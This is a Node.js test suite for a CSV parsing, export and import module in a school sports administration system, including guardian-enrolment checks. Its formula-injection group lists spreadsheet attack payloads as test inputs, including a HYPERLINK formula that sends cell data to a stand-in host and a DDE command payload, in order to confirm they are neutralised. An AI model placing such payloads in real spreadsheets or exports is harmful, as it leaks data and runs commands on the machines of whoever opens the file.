#!/usr/bin/env node
/**
 * The CSV edge cases, which are the whole job.
 *
 * A parser that handles well-formed input is not a feature — every school's
 * file is malformed in some ordinary way, and each assertion here is a shape
 * one of them will actually send. The injection group is the one that matters
 * most: a cell is a program in every spreadsheet application, and this data is
 * typed by hundreds of people at schools.
 *
 *   node services/api/io/csv.test.mjs
 */
import { parseCsv, toCsv, neutralise, mapRows,
         asText, asDate, asInt, asOneOf, asEmail, asPhone } from "./csv.mjs";

let pass = 0, fail = 0;
/** @param {string} n @param {unknown} c */
const ok = (n, c) => { if (c) pass++; else { fail++; console.log("  ✗", n); } };
const group = (/** @type {string} */ t) => console.log("\n" + t);

group("A. Parsing what schools actually send");
{
  const p = parseCsv("full_name,team_code\nA Botha,1XI\n");
  ok("a plain file parses", p.header.join(",") === "full_name,team_code");
  ok("...with one row", p.rows.length === 1 && p.rows[0][0] === "A Botha");

  // Excel writes a BOM. Without stripping it the first header becomes
  // "﻿full_name" and the column silently vanishes — the file looks fine
  // and the import reports every row as missing a name.
  const bom = parseCsv("﻿full_name,team_code\nA Botha,1XI\n");
  ok("a BOM does not eat the first header", bom.header[0] === "full_name");

  ok("CRLF line endings", parseCsv("a,b\r\n1,2\r\n").rows[0].join(",") === "1,2");
  ok("lone CR line endings", parseCsv("a,b\r1,2\r").rows[0].join(",") === "1,2");
  ok("mixed endings in one file", parseCsv("a,b\r\n1,2\n3,4\r").rows.length === 2);
  ok("no trailing newline", parseCsv("a,b\n1,2").rows.length === 1);
  ok("a trailing newline adds no empty row", parseCsv("a,b\n1,2\n").rows.length === 1);
  ok("blank lines are dropped", parseCsv("a,b\n1,2\n\n\n3,4\n").rows.length === 2);
  ok("headers are lowercased and trimmed",
     parseCsv(" Full_Name , Team_Code \n").header.join(",") === "full_name,team_code");
}

group("B. Quoting, which is where naive parsers break");
{
  ok("a quoted comma stays one field",
     parseCsv('a,b\n"Botha, A",1XI\n').rows[0][0] === "Botha, A");
  ok("...and the row still has two fields",
     parseCsv('a,b\n"Botha, A",1XI\n').rows[0].length === 2);
  ok('"" is one literal quote',
     parseCsv('a\n"He said ""no"""\n').rows[0][0] === 'He said "no"');
  ok("a newline inside quotes stays in the field",
     parseCsv('a,b\n"line one\nline two",x\n').rows[0][0] === "line one\nline two");
  ok("...and does not split the row",
     parseCsv('a,b\n"line one\nline two",x\n').rows.length === 1);
  ok("an empty field is empty, not missing",
     parseCsv("a,b,c\n1,,3\n").rows[0].length === 3);
  ok("whitespace in a value is NOT trimmed by the parser",
     parseCsv("a\n  spaced  \n").rows[0][0] === "  spaced  ");
}

group("C. A CSV cell is a program, and this is the guard");
{
  // Excel, Numbers and LibreOffice all evaluate a cell starting = + - or @.
  // A hometown typed as a formula becomes live when a bursar opens the export.
  for (const attack of [
    '=HYPERLINK("http://evil.example/?"&A1,"click")',
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
    "=cmd|' /C calc'!A0",
  ]) {
    ok(`${attack.slice(0, 18)}… is neutralised`, neutralise(attack).startsWith("'"));
  }
  ok("a tab lead-in is neutralised too", neutralise("\t=1+1").startsWith("'"));
  ok("ordinary text is untouched", neutralise("A Botha") === "A Botha");
  // A number must NOT be prefixed, or no spreadsheet will sum the column.
  ok("a real number is left as a number", neutralise(42) === "42");
  ok("...including a negative one", neutralise(-3) === "-3");
  ok("a negative typed as TEXT is still neutralised", neutralise("-3") === "'-3");

  const csv = toCsv([{ hometown: "=1+1", name: "A Botha" }], ["name", "hometown"]);
  ok("export neutralises in the file itself", /,'=1\+1/.test(csv));
  ok("...and the safe cell is unquoted", /A Botha/.test(csv));
}

group("D. Serialising");
{
  const csv = toCsv([{ a: 1, b: "x,y" }, { a: 2, b: 'say "hi"' }], ["a", "b"]);
  const lines = csv.replace(/^﻿/, "").trimEnd().split("\r\n");
  ok("a header row", lines[0] === "a,b");
  ok("a comma is quoted", lines[1] === '1,"x,y"');
  ok("a quote is doubled", lines[2] === '2,"say ""hi"""');
  ok("CRLF between rows", csv.includes("\r\n"));
  // Without the BOM, Excel on Windows reads UTF-8 as the local code page and
  // every name with a diacritic arrives mangled in a document a school prints.
  ok("a BOM leads the file", csv.charCodeAt(0) === 0xfeff);

  ok("column order is the given one, not the first row's keys",
     toCsv([{ b: 1, a: 2 }], ["a", "b"]).includes("a,b"));
  ok("a missing key is an empty cell, not undefined",
     /^2,$/m.test(toCsv([{ a: 2 }], ["a", "b"]).replace(/^﻿/, "")));
  // A birthday is a DAY. A timestamp with a zone is that day in one country
  // and the day before in another.
  ok("a date is a plain day",
     toCsv([{ born: new Date("2011-04-07T22:00:00Z") }], ["born"]).includes("2011-04-07"));
  ok("an object is JSON, not [object Object]",
     toCsv([{ guardian: { name: "D Pillay" } }], ["guardian"]).includes("D Pillay"));
  // Asserted on the split rather than on a trimmed string: an empty cell IS a
  // trailing newline, so trimEnd() removes the very thing under test. The
  // first version of this assertion did exactly that and reported a bug in
  // code that was correct.
  ok("null is an empty cell, and the row is still there",
     toCsv([{ a: null }], ["a"]).replace(/^﻿/, "").split("\r\n").slice(0, 2).join("|") === "a|");
}

group("E. Round trip");
{
  const rows = [
    { full_name: 'Botha, A "Andy"', team_code: "1XI", hometown: "Line\nBreak" },
    { full_name: "=formula", team_code: "2XI", hometown: "" },
  ];
  const back = parseCsv(toCsv(rows, ["full_name", "team_code", "hometown"]));
  ok("the header survives", back.header.join(",") === "full_name,team_code,hometown");
  ok("both rows survive", back.rows.length === 2);
  ok("a quoted comma and quotes survive", back.rows[0][0] === 'Botha, A "Andy"');
  ok("an embedded newline survives", back.rows[0][2] === "Line\nBreak");
  // Deliberately NOT symmetric: the neutralising apostrophe stays, because
  // the file is the artefact and the file must stay safe to open.
  ok("the neutralised cell keeps its apostrophe", back.rows[1][0] === "'=formula");
}

group("F. Mapping, and the line numbers a person is looking at");
{
  const spec = {
    full_name: { required: true, parse: asText(120) },
    team_code: { parse: asText(8) },
    born:      { parse: asDate },
    squad_no:  { parse: asInt({ min: 1, max: 99 }) },
  };
  const good = mapRows(parseCsv(
    "full_name,team_code,born,squad_no\nA Botha,1XI,2011-04-07,7\n"), spec);
  ok("a clean row maps", good.rows.length === 1 && good.errors.length === 0);
  ok("...typed, not stringly", good.rows[0].values.squad_no === 7);
  // +1 for zero-based, +1 for the header: the number in their left margin.
  ok("the line number is the spreadsheet's", good.rows[0].line === 2);

  const bad = mapRows(parseCsv(
    "full_name,born,squad_no\n" +
    "A Botha,2011-04-07,7\n" +      // line 2, fine
    ",2011-04-07,7\n" +             // line 3, no name
    "C Dlamini,07/04/2011,7\n" +    // line 4, ambiguous date
    "D Ellis,2011-04-07,0\n" +      // line 5, squad number out of range
    "E Farrell,2011-02-30,7\n"),    // line 6, not a real date
    spec);
  ok("the good row is kept", bad.rows.length === 1 && bad.rows[0].line === 2);
  ok("every bad row is reported at once", bad.errors.length === 4);
  ok("...a missing name at line 3",
     bad.errors.some((e) => e.line === 3 && /required/.test(e.message)));
  // THE ONE THAT MATTERS MOST. 07/04/2011 is 7 April here and 4 July in the
  // United States, both spellings arrive in real files, and a silent guess
  // puts a boy in the wrong age group — the exact failure the squad
  // eligibility trigger exists to prevent, arriving through a side door.
  ok("...an ambiguous date REFUSED, not guessed, at line 4",
     bad.errors.some((e) => e.line === 4 && /ambiguous/.test(e.message)));
  ok("...a squad number out of range at line 5",
     bad.errors.some((e) => e.line === 5 && /at least 1/.test(e.message)));
  ok("...a date that does not exist at line 6",
     bad.errors.some((e) => e.line === 6 && /not a real date/.test(e.message)));
  ok("the failing value is echoed so they can find it",
     bad.errors.find((e) => e.line === 4)?.value === "07/04/2011");

  const noCol = mapRows(parseCsv("team_code\n1XI\n"), spec);
  ok("a file with no required column fails once, not per row",
     noCol.errors.length === 1 && /no full_name column/.test(noCol.errors[0].message));

  // Not an error: a school's export has fifty columns and we want four. But
  // reported, because a header typo looks exactly like a column we chose not
  // to read and only they can tell which.
  const extra = mapRows(parseCsv("full_name,house,nickname\nA Botha,Founders,Bots\n"), spec);
  ok("unused columns are reported, not rejected",
     extra.rows.length === 1 && extra.unknown.join(",") === "house,nickname");
}

group("G. The field parsers refuse rather than guess");
{
  const t = (/** @type {(v: string) => any} */ fn, /** @type {string} */ v) => { try { return fn(v); } catch (/** @type {any} */ e) { return "ERR:" + e.message; } };
  ok("a vocabulary takes the canonical spelling, not theirs",
     asOneOf(["batsman", "bowler"])("BATSMAN") === "batsman");
  ok("...and refuses what is not in it",
     /must be one of/.test(t(asOneOf(["batsman"]), "wizard")));
  ok("a whole number refuses decimals", /whole number/.test(t(asInt(), "7.5")));
  ok("...and refuses text", /whole number/.test(t(asInt(), "seven")));
  ok("an email refuses a phone number", /email/.test(t(asEmail, "0821234567")));
  ok("...and lowercases a real one", asEmail("A.Botha@Hilton.CO.za") === "a.botha@hilton.co.za");
  ok("a phone refuses something too short", /too short/.test(t(asPhone, "123")));
  ok("...and keeps a real one as typed", asPhone("+27 82 100 0001") === "+27 82 100 0001");
  ok("text refuses over-length", /120 characters/.test(t(asText(120), "x".repeat(121))));
}

group("H. The template a school downloads is a file the importer accepts");
{
  // GET /api/import/players/template sends the header and this one row. Its
  // first version had ten values for twelve columns and "right" for a hand,
  // so the example itself failed on four columns. Read it through the spec.
  const { IMPORTS } = await import("./import-api.mjs");
  const def = IMPORTS.players;
  const parsed = parseCsv(def.template.join(",") + "\n" + def.example + "\n");
  ok("the example has one value per column",
     parsed.rows[0]?.length === def.template.length);
  const mapped = mapRows(parsed, def.spec);
  ok("...and every one of them parses", mapped.errors.length === 0 && mapped.rows.length === 1);
  ok("...with no column the importer does not read", mapped.unknown.length === 0);
  const checked = def.resolve?.(mapped.rows[0].values, null);
  ok("...and a new player from it passes the birth-date rule", checked?.ok === true);
}

group("I. Guardians: each row is enrolment, and the import refuses rather than guesses");
{
  const { IMPORTS, GUARDIAN_RELATIONSHIPS } = await import("./import-api.mjs");
  const def = IMPORTS.guardians;
  const apply = /** @type {NonNullable<typeof def.apply>} */ (def.apply);

  // The template and its example go through the spec cleanly.
  const parsed = parseCsv(def.template.join(",") + "\n" + def.example + "\n");
  const mapped = mapRows(parsed, def.spec);
  ok("the guardians template's example parses, every column read",
     mapped.errors.length === 0 && mapped.rows.length === 1 && mapped.unknown.length === 0);
  ok("...the header the office fills",
     def.template.join(",") === "player_full_name,guardian_name,guardian_email,relationship");
  ok("the role is not a column", !("role" in def.spec));
  ok("the relationship is the link vocabulary less self and enquiry",
     !GUARDIAN_RELATIONSHIPS.includes("self") && !GUARDIAN_RELATIONSHIPS.includes("enquiry"));
  const noRel = mapRows(parseCsv("player_full_name,guardian_name,guardian_email\nA,B C,b@example.invalid\n"), def.spec);
  ok("a file with no relationship column is refused once, not assumed parent",
     noRel.errors.length === 1 && /no relationship column/.test(noRel.errors[0].message));

  // A database stand-in: the boys, the accounts and the links a query would
  // find, and every enrol_person() call recorded with what it was asked.
  /** @typedef {{ sql: string, params: unknown[] }} Call */
  /**
   * @param {{ boys?: Record<string, string[]>, accounts?: Record<string, { id: string, name: string, player_id?: string | null }>,
   *           links?: Record<string, string>, enrol?: (p: unknown[]) => { ok: boolean, reason?: string } }} world
   */
  const fake = (world) => {
    /** @type {Call[]} */ const enrolled = [];
    const client = {
      /** @param {string} sql @param {unknown[]} [params] */
      query: async (sql, params = []) => {
        /** @param {any[]} rows */
        const out = (rows) => ({ rows, rowCount: rows.length });
        if (/from player/.test(sql)) return out((world.boys?.[String(params[1]).trim().toLowerCase()] ?? []).map((id) => ({ id })));
        if (/from app_user/.test(sql)) { const a = world.accounts?.[String(params[0])]; return out(a ? [a] : []); }
        if (/from assignment_subject/.test(sql)) {
          const st = world.links?.[`${params[0]}|${params[2]}`];
          return out(st ? [{ verification_state: st }] : []);
        }
        if (/enrol_person/.test(sql)) { enrolled.push({ sql, params }); return out([world.enrol?.(params) ?? { ok: true }]); }
        throw new Error("unexpected query: " + sql);
      },
    };
    return { client: /** @type {any} */ (client), enrolled };
  };
  /** @param {string} child @param {string} name @param {string} email @param {string} [rel] */
  const row = (child, name, email, rel = "parent") =>
    ({ player_full_name: child, guardian_name: name, guardian_email: email, relationship: rel });
  const HIL = "11111111-1111-1111-1111-111111111111";

  // One email, two boys: two enrolments of the one address, each granting guardian.
  {
    const { client, enrolled } = fake({ boys: { "fake pupil one": ["p1"], "fake pupil two": ["p2"] } });
    const file = new Map();
    const a = await apply(client, HIL, row("Fake Pupil One", "Fake Parent", "fp@example.invalid"), file, 2);
    const b = await apply(client, HIL, row("Fake Pupil Two", "Fake Parent", "fp@example.invalid"), file, 3);
    ok("one email for two children: both lines are links", a.ok && a.did === "insert" && b.ok && b.did === "insert");
    ok("...two enrolments of the one address, one per boy",
       enrolled.length === 2 && enrolled.every((c) => c.params[0] === "fp@example.invalid")
       && enrolled[0].params[3] === "p1" && enrolled[1].params[3] === "p2");
    ok("nothing beyond guardian: the role is written into the call, never read from the file",
       enrolled.every((c) => /enrol_person\(\$1, \$2, 'guardian', \$3, null, \$4, \$5\)/.test(c.sql)
                            && !c.params.includes("schooladmin")));
    const c = await apply(client, HIL, { ...row("Fake Pupil One", "Fake Parent X", "x@example.invalid"), role: "schooladmin" }, new Map(), 2);
    ok("...even when a row carries a role", c.ok && enrolled.length === 3 && /'guardian'/.test(enrolled[2].sql)
       && !enrolled[2].params.includes("schooladmin"));
  }

  // Every refusal, and that a refusal never reaches enrolment.
  /** @param {any} out @param {string | null} column @param {RegExp} re */
  const refused = (out, column, re) => out.ok === false && out.column === column && re.test(out.message);
  {
    const world = {
      boys: { "fake pupil one": ["p1"], "fake twin": ["t1", "t2"] },
      accounts: { "coach@example.invalid": { id: "u1", name: "C Coach" },
                  "pupil@example.invalid": { id: "u2", name: "A Pupil", player_id: "p9" },
                  "linked@example.invalid": { id: "u3", name: "Fake Linked" },
                  "waiting@example.invalid": { id: "u4", name: "Fake Waiting" } },
      links: { "u3|p1": "verified", "u4|p1": "pending" },
    };
    const { client, enrolled } = fake(world);
    const one = async (/** @type {Record<string, any>} */ r, file = new Map()) => apply(client, HIL, r, file, 3);
    ok("a relationship enrolment cannot record is refused, not written as parent",
       refused(await one(row("Fake Pupil One", "Fake Gran", "g@example.invalid", "grandparent")), "relationship", /parent link only/));
    ok("a boy not found is an error on the line",
       refused(await one(row("Fake Nobody", "Fake Parent", "n@example.invalid")), "player_full_name", /no player at this school/));
    ok("two boys of one name are refused, never guessed",
       refused(await one(row("Fake Twin", "Fake Parent", "t@example.invalid")), "player_full_name", /more than one player/));
    ok("an email that is a pupil's own account",
       refused(await one(row("Fake Pupil One", "A Pupil", "pupil@example.invalid")), "guardian_email", /pupil's own account/));
    ok("an email that is already another person's account",
       refused(await one(row("Fake Pupil One", "Fake Parent", "coach@example.invalid")), "guardian_email", /already C Coach's account/));
    ok("...but the same person, by name, is the coach who is also a parent",
       (await one(row("Fake Pupil One", " c  coach ", "coach@example.invalid"))).ok === true);
    ok("a link already verified is left as it is",
       (/** @type {any} */ (await one(row("Fake Pupil One", "Fake Linked", "linked@example.invalid")))).did === "unchanged");
    ok("a link waiting to be verified is not doubled",
       refused(await one(row("Fake Pupil One", "Fake Waiting", "waiting@example.invalid")), null, /verify that request/));
    const file = new Map([["d@example.invalid|fake pupil one", 2]]);
    ok("the same guardian and child twice in the file",
       refused(await one(row("Fake Pupil One", "Fake Dup", "d@example.invalid"), file), null, /on line 2/));
    const named = new Map([["email:e@example.invalid", { name: "fake first", as: "Fake First", line: 2 }]]);
    ok("one email under two names in the file",
       refused(await one(row("Fake Pupil One", "Fake Second", "e@example.invalid"), named), "guardian_email", /Fake First's on line 2/));
    ok("none of those refusals reached enrolment, but the one it should have",
       enrolled.length === 1 && enrolled[0].params[0] === "coach@example.invalid");
  }

  // Enrolment's own refusals come back on the line, in the office's words.
  for (const [reason, column, re] of /** @type {[string, string | null, RegExp][]} */ ([
    ["player_is_an_adult", "player_full_name", /eighteen/],
    ["player_date_of_birth_required", "player_full_name", /date of birth/],
    ["email_belongs_to_another_school", "guardian_email", /another school/],
    ["not_permitted", null, /not permitted/],
  ])) {
    const { client } = fake({ boys: { "fake pupil one": ["p1"] }, enrol: () => ({ ok: false, reason }) });
    ok(`enrolment's ${reason} is that line's error`,
       refused(await apply(client, HIL, row("Fake Pupil One", "Fake Parent", "fp@example.invalid"), new Map(), 2), column, re));
  }
}

console.log(`\n${"─".repeat(52)}\nCSV SUITE: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
